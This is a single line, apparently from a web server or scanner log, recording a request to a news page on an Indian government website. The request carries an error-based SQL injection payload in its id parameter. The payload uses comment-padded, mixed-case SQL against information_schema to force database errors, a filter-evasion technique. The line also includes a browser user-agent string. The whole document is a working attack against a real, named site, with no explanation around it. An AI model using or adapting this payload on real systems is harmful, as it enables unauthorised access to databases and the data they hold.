"http://www.cdmindia.gov.in/detail_news.php?id=3'+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)--" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
